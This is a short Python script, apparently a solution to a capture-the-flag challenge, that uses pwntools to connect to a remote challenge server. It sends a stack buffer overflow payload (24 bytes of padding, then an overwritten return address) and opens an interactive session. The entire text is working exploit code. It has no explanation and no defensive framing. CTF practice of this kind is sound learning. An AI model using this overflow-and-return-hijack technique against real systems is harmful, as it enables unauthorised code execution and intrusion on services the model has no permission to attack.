from pwn import *

context.binary = "./chall"
p = remote('tjc.tf', 31680)
junk = B"A"*24
retn = p64(0x40119b)
garbage = B"A"*8
p.recvline()
p.sendline(junk + retn + garbage)
p.interactive()
